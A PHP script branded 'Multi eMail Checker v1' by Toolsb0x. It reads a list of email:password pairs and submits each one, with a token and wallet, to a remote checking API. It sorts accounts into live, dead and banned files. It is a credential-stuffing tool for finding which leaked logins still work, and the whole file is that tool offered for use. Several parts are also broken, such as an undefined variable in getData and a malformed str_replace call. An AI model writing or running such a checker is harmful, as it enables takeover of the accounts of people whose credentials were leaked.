<?php 

ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));
error_reporting(0);
require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

/////////////////input here///////////////////
$token ="tokenhere"; // insert your token here
$wallet="wallerhere"; // insert your wallet here
$urlapi = "apiurl"; ////change url api from sh
/////////////////////////////////////////////

echo banner();
enterlist:
$listname = readline(" Enter list: ");
if(empty($listname) || !file_exists($listname)) {
    echo" [?] list not found".PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" Save to dir (default: valid): ");
$dir = empty($savedir) ? "valid" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" Request email per second (*max 10) ? ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if($reqemail > 10) {
    echo " [*] max 10".PHP_EOL;
    goto reqemail;
}
$delpercheck = readline(" Delete list per check? (y/n): ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;

$no = 0;
$total = count($lists);
$live = 0;
$dead = 0;
$c = 0;

echo PHP_EOL;
$getdata = getData();
if($getdata == 200) die(PHP_EOL."* FAILED".PHP_EOL);
    $rollingCurl = new \RollingCurl\RollingCurl();
    foreach($lists as $list){
    $c++;
    if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
    else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
    else $email = $list;
    if(empty($email)) continue;
    if($c%60000==0) {
        if(file_exists(dirname(__FILE__)."cookies/toolsb0x.txt")) unlink(dirname(__FILE__)."cookies/toolsb0x.txt");
        $getdata = getData();
    }
    $email = str_replace(" ", "", $email);
    $header = array(
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.118"
    );
    $rollingCurl->setOptions(array(
        CURLOPT_RETURNTRANSFER => 1, 
        CURLOPT_ENCODING => "gzip", 
        CURLOPT_COOKIEJAR => dirname(__FILE__)."cookies/toolsb0x.txt", 
        CURLOPT_COOKIEFILE => dirname(__FILE__)."cookies/toolsb0x.txt", 
        CURLOPT_SSL_VERIFYPEER => 0, 
        CURLOPT_SSL_VERIFYHOST => 0,
        //CURLOPT_PROXY => "127.0.0.1:8989",
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->get($urlapi."?list=".$email.":".$pwd."&token=".$token."&wallet=".$wallet, $header);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) {
    global $listname, $dir, $delpercheck, $no, $total, $live, $dead, $unknown, $connection, $insufficient, $email;
    $no++;
    parse_str(parse_url($request->getUrl(), PHP_URL_QUERY));
    $x = $request->getResponseText();
    $deletelist = 1;
    echo " [".date("H:i:s")." ".$no."/".$total." from ".$listname."]";
    if(preg_match("#login_failed#", $x)) {
        $dead++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("dead.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."DEAD".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }elseif(preg_match("#login_sukses#", $x)) {
        $live++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("live.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LG"]."LIVE".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
    elseif(preg_match("#login_banned#", $x)) {
        $unknown++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("banned.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."BANNED".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
    elseif(preg_match("#connection#", $x)) {
        $connection++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("connection.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."connection".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
    elseif(preg_match("#insufficient#", $x)) {
        $insufficient++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("insufficient.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."insufficient".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
    if($delpercheck && $deletelist) {
        $getfile = file_get_contents("../".$listname);
        $awal = str_replace("\r", "", $getfile);
        $akhir = str_replace($list."","", "", $awal);
        file_put_contents("../".$listname, $akhir);
    }
    echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
if($delpercheck && count(explode("\n", file_get_contents("../".$listname))) <= 1) unlink("../".$listname);
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Dead: ".$dead.PHP_EOL." Saved to dir \"".$dir."\"".PHP_EOL;

function banner() {
    $out = color()["LW"]."     _____________".color()["MG"]."______________".color()["CY"]."_______________".color()["LM"]."_____________
    |                                                       |
    |           ".color()["LG"]."     Multi ".color()["CY"]."eMail ".color()["MG"]."Checker v1                 |
    |  Latest ".color()["LR"]."Update on ".color()["LW"]."Tuesday, ".color()["CY"]."June 01, 2020 at".color()["MG"]." 00:00:00  |
    |      Author: ".color()["LW"]."Toolsb0x ".color()["MG"]."(https://toolsb0x.com/)         |
    |_____________".color()["LG"]."______________".color()["CY"]."_______________".color()["MG"]."_____________|".color()["LW"]."
                ".color()["WH"]."
".color()["WH"].PHP_EOL.PHP_EOL;
    return $out;
}
function color() {
    return array(
        "LW" => (OS == "linux" ? "\e[1;37m" : ""),
        "WH" => (OS == "linux" ? "\e[0m" : ""),
        "YL" => (OS == "linux" ? "\e[1;33m" : ""),
        "LR" => (OS == "linux" ? "\e[1;31m" : ""),
        "MG" => (OS == "linux" ? "\e[0;35m" : ""),
        "LM" => (OS == "linux" ? "\e[1;35m" : ""),
        "CY" => (OS == "linux" ? "\e[1;36m" : ""),
        "LG" => (OS == "linux" ? "\e[1;32m" : "")
    );
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function getData() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlapi);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__)."cookies/toolsb0x.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."cookies/toolsb0x.txt");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $x = curl_exec($ch);
    ///$out = url_getinfo($ch, CURLINFO_HTTP_CODE);
    $strHeader = get_headers($x)[0];
    $statusCode = substr($strHeader, 9, 3 );
    curl_close($ch);
    return $statusCode;
}
function curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}
